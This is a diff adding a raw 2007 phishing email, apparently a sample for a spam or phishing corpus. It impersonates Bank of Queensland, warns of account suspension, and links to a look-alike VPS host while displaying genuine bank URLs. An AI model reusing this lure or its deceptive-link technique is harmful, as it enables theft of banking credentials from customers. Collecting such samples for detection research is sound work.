@@ -1,0 +1,144 @@
+From nobody Sun Jan 25 13:50:02 2015
+Return-Path: <security@boq.com.au>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 1E02B46926
+ for <user@login.example.com>; Sat, 31 Mar 2007 20:02:19 -0400 (EDT)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by mail.example.org (Postfix) with ESMTP id D4F31131F981
+ for <user@example.com>; Sat, 31 Mar 2007 20:02:18 -0400 (EDT)
+Received: from boq22.com (wvps212-241-200-146.vps.webfusion.co.uk
+ [212.241.200.146])
+ by mail.example.org (Postfix) with SMTP id 602E36FA1A8
+ for <user@example.com>; Sat, 31 Mar 2007 20:02:18 -0400 (EDT)
+From: Bank of Queensland <security@boq.com.au>
+To: user@example.com
+Reply-To: security@boq.com.au
+Subject: Internet Banking Urgent Security Notice
+Date: Sun, 01 Apr 2007 02:02:19 +0200
+MIME-Version: 1.0
+Content-Type: multipart/related;
+ boundary="fdfdc5f1-7127-4f0a-96b1-3b29ce0467cf"
+Message-Id: <20070401000218.602E36FA1A8@mail.example.org>
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 1056
+
+
+This is a multi-part message in MIME format
+--fdfdc5f1-7127-4f0a-96b1-3b29ce0467cf
+Content-Type: text/html; charset=iso-8859-1
+Content-Transfer-Encoding: quoted-printable
+
+<html>
+<head>
+<style type=3D"text/css">
+<!-- 
+	body { font-family: tahoma, helvetica, sans-serif; font-size: 10pt; color: =
+black; background: #FFFFFF;}
+	td   { font-size: 10pt;}	
+	.small { font-size: 7pt; }
+	.j { font-size: 8pt; }
+}-->	
+</style>
+</head>
+<body>
+
+<center>
+<table  cellpadding=3D2 cellspacing=3D2 width=3D650 bgcolor=3D#FFFECD style=3D=
+"border: 1px solid orange">
+<td>
+<table bgcolor=3D#FFFFFF cellpadding=3D0 cellspacing=3D0 width=3D100%>
+<tr><td background=3D=
+http://www.boq.com.au/uploadedImages/_shared_content/Spotlight_images/welcome=
+_bank_queensland.jpg>
+<img src=3Dhttp://www.boq.com.au/images/header_logo.gif></td></tr>
+<tr><td bgcolor=3D#1D75BB><img src=3D=
+http://www.boq.com.au/images/bank_diff_93.gif></td></tr>
+</td>
+
+</tr>
+</table>
+<center>
+<br>
+<table cellpadding=3D20 width=3D580 cellspacing=3D5>
+
+<tr>
+<td align=3Djustify>
+		<b>The Bank of Queensland Online Security Department</b> has been receiving =
+complaints 
+		from our customers for unauthorised uses of the Bank of Queensland Online =
+accounts.
+		As a result we are temporarily shutting down some selected Online 
+		Accounts perceived vulnerable to this, pending till the time we carry out
+		proper verification by the account owner. <b>Bank of Queensland</b> is =
+committed to ensure the safeguard of
+		each customer personal information, making sure only authorised individuals =
+
+		have access to their accounts.<br><br>
+            <br>
+
+
+            <b>As a first step</b> to have Your Bank of Queensland Online =
+Access reactivated please 
+            reconfirm your identity by using the link provided =
+below.<br><br><br>
+<table width=3D100% cellpadding=3D0 cellspacing=3D0>
+
+<td>
+
+<table cellpadding=3D4 width=3D100% bgcolor=3D#E0ECF8 style=3D"border: 1px =
+solid orange"><td>
+<font color=3Dorange><li><font color=3Dblack class=3Dj><b>Internet =
+Banking</b> - for existing customers registered <b>before</b> 31 July 2006 =
+click on the link provided below.</font>
+<br><br>
+
+<a href=3D=
+http://wvps212-241-200-172.vps.webfusion.co.uk/www.ib1.boq.com.au/index.php><=
+b>https://www.ib1.boq.com.au/costumers/secure-login/index.asp</b></a>
+</td></table>
+<br>
+
+<table cellpadding=3D4 width=3D100% bgcolor=3D#E0ECF8 style=3D"border: 1px =
+solid orange"><td>
+<font color=3Dorange><li><font color=3Dblack  class=3Dj>
+<b>Enhanced Internet Banking</b> - for all customers registered <b>after</b> =
+31 July 2006 click on the link provided below.</font>
+<br><br>
+
+<a href=3D=
+http://wvps212-241-200-172.vps.webfusion.co.uk/www.ib.boq.com.au/index.php><b=
+>https://www.ib.boq.com.au/costumers/secure-login/index.asp</b></a>
+</td></table>
+<br><br>
+<b>These instructions</b> are sent to and should be followed by all Bank of =
+Queensland 
+clients,to avoid service deactivation after the verification is completed.
+
+We apologise for any inconveniences and thank you for your cooperation.
+
+</td>
+</tr>
+</table>
+<table width=3D500 cellpadding=3D0 cellspacing=3D0>
+<td><br><br><b>Bank of Queensland Security Department</b><br><br><br><td =
+align=3Dright><img src=3D=
+http://www.boq.com.au/uploadedImages/RHS_content/RHS_Promo_bars/BPAY_final(1)=
+gif><br><br></td>
+</table>
+<table width=3D100% style=3D"border-bottom: 2px solid orange" cellpadding=3D5 =
+cellspacing=3D0>
+<tr>
+<td bgcolor=3D#FFFD9B align=3Dcenter> &copy; Copyright All rights reserved. =
+Bank of Queensland Limited ABN 32 009 656 740.</td></table>
+</td>
+</tr>
+
+</table>
+
+</body>
+</html>  
+--fdfdc5f1-7127-4f0a-96b1-3b29ce0467cf--
